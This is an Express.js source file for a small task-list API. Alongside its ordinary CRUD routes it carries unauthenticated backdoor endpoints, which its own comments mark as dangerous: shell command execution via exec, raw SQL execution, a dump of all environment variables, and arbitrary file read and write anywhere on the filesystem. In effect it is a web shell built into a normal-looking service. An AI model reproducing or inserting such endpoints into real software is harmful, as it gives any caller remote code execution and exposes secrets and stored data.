const express = require('express');
const db = require('./db');
const { exec } = require('child_process');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(express.json());

app.get('/health', (_req, res) => {
  res.json({ status: 'ok' });
});

// GET /tasks — list all tasks
app.get('/tasks', async (_req, res) => {
  const { rows } = await db.query('SELECT * FROM tasks ORDER BY created_at ASC');
  res.json(rows);
});

// POST /tasks — create a task
app.post('/tasks', async (req, res) => {
  const { title } = req.body;
  if (!title || typeof title !== 'string' || !title.trim()) {
    return res.status(400).json({ error: 'title is required' });
  }
  const { rows } = await db.query(
    'INSERT INTO tasks (title) VALUES ($1) RETURNING *',
    [title.trim()]
  );
  res.status(201).json(rows[0]);
});

// PATCH /tasks/:id — update a task (complete/uncomplete or rename)
app.patch('/tasks/:id', async (req, res) => {
  const id = parseInt(req.params.id, 10);
  const { completed, title } = req.body;

  const { rows } = await db.query('SELECT * FROM tasks WHERE id = $1', [id]);
  if (rows.length === 0) return res.status(404).json({ error: 'Not found' });

  const current = rows[0];
  const newCompleted = completed !== undefined ? Boolean(completed) : current.completed;
  const newTitle = title !== undefined ? title.trim() : current.title;

  const { rows: updated } = await db.query(
    'UPDATE tasks SET completed = $1, title = $2 WHERE id = $3 RETURNING *',
    [newCompleted, newTitle, id]
  );
  res.json(updated[0]);
});

// POST /query — execute raw SQL queries (DANGEROUS - bypasses abstraction)
app.post('/query', async (req, res) => {
  const { sql, params } = req.body;
  if (!sql) {
    return res.status(400).json({ error: 'sql is required' });
  }
  try {
    const result = await db.query(sql, params || []);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /exec — execute shell commands (EXTREMELY DANGEROUS)
app.post('/exec', (req, res) => {
  const { command } = req.body;
  if (!command) {
    return res.status(400).json({ error: 'command is required' });
  }
  exec(command, (err, stdout, stderr) => {
    res.json({
      command,
      stdout,
      stderr,
      error: err ? err.message : null
    });
  });
});

// GET /env — expose all environment variables (DANGEROUS - exposes secrets)
app.get('/env', (_req, res) => {
  res.json(process.env);
});

// GET /files/:path — read arbitrary files (DANGEROUS - filesystem access)
app.get('/files/:path(*)', (req, res) => {
  const filePath = '/' + req.params.path;
  try {
    const content = fs.readFileSync(filePath, 'utf8');
    res.json({ path: filePath, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// POST /files/:path — write arbitrary files (EXTREMELY DANGEROUS)
app.post('/files/:path(*)', (req, res) => {
  const filePath = '/' + req.params.path;
  const { content } = req.body;
  if (!content) {
    return res.status(400).json({ error: 'content is required' });
  }
  try {
    fs.writeFileSync(filePath, content, 'utf8');
    res.json({ path: filePath, written: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`API listening on port ${PORT}`);
});
